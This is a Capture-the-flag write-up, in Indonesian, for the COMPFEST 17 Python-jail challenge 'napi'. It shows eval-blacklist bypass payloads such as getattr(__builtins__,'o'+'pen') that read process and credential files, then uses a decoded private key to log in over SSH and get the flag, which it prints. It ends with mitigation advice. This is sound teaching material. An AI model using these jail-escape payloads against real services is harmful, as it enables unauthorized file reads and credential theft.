# Write-up: **napi** (Misc) — COMPFEST 17

## Deskripsi Singkat

* **Kategori:** Misc / Python jail
* **Endpoint:** `nc ctf.compfest.id 7601`
* **Goal:** Dapatkan flag meski ada “penjara” (blacklist) pada input.

## Intuisi & Analisis

Service meminta username; jika `john`, input berikutnya di-**eval()** dengan beberapa **substring blacklist** dan cek **ASCII-only**. Cuplikan logika penting (disederhanakan):

* `__import__` dihapus.
* Blacklist substring: `['eval','exec','import','open','system','globals','os','password','admin','pop','clear','remove']`
* Input harus ASCII; kalau mengandung substring terlarang atau non-ASCII → blokir.
* `eval(inp)` dipanggil di dalam `try/except` → exception tampil sebagai `Cannot execute ...`.

Artinya:

* **Tidak ada sandbox kuat**; hanya blacklist substring.
* Kita tetap bisa memanggil builtins dengan **penyusunan string** agar lolos blacklist, mis. `getattr(__builtins__,'o'+'pen')`.

Awalnya saya coba trik `object.__subclasses__()` → `FileIO(...)` untuk baca file tanpa “open”, tapi runtime container ini **tidak memuat** `FileIO` (hanya `['_IOBase','_BytesIOBuffer']`), jadi pendekatan itu tidak jalan.

## Eksploitasi

1. **Login sebagai john**

```bash
nc ctf.compfest.id 7601
Enter your username: john
john >
```

2. **Bypass kata “open”** (tanpa menulis “open” utuh)

```python
print(getattr(__builtins__,'o'+'pen')('/proc/self/cmdline','rb').read())
# b'/usr/bin/python3.7\x00chall.py\x00' → kerja di CWD bareng chall.py
```

3. **Baca petunjuk** di file yang “aman” ditebak ada di CWD

```python
print(getattr(__builtins__,'o'+'pen')('notice.txt','r').read())
```

Output menyebut: *“login to admin\@THIS\_SERVER\_IP:7602 with your password as the SSH key …”*
→ Jadi ada **layanan kedua di port 7602** dan “password”-nya adalah **SSH private key**.

4. **Ambil kredensial** (private key) dari file lain di CWD

```python
print(getattr(__builtins__,'o'+'pen')('creds.txt','r').read())
```

Hasilnya adalah **Base64** dari sebuah **RSA PRIVATE KEY**.

5. **Gunakan key** untuk akses service di 7602
   Di mesin lokal:

```bash
# Simpan base64 ke file
cat > key.b64 <<'EOF'
<tempel BASE64 dari creds.txt>
EOF

# Decode & amankan permission
base64 -d key.b64 > key.pem
chmod 600 key.pem

# Coba SSH-like service (kalau bukan SSH standar, gunakan nc dan paste key pem)
ssh -p 7602 -i key.pem admin@ctf.compfest.id
# atau
nc ctf.compfest.id 7602
# lalu paste seluruh isi key.pem (BEGIN..END)
```

6. **Dapatkan flag**
   Service port 7602 memverifikasi key dan mengeluarkan flag:

**`COMPFEST17{j0hN_1s_a_mF_G_49e65c3afb}`**

## Catatan Teknis

* **Blacklist substring** mudah dibypass: gunakan **string concatenation** (`'o'+'pen'`) atau atribut tak langsung (`getattr`, `__dict__`).
* Trik `__loader__.get_data(path)` juga sering efektif untuk baca file tanpa “open”, tapi di sini cukup dengan “open bypass”.
* Pendekatan `FileIO` gagal karena kelasnya **tidak ter-load** di runtime ini.

## Mitigasi (untuk penyelenggara)

* Jangan pernah `eval()` input user. Gunakan parser/VM terbatas atau `ast.literal_eval` (jika perlu).
* Batasi **builtins** dan akses filesystem (jangan taruh kredensial di CWD; simpan di environment terisolasi).
* Hindari **security by blacklist**; gunakan whitelist + sandbox nyata.

## Flag

**`COMPFEST17{j0hN_1s_a_mF_G_49e65c3afb}`** ✅
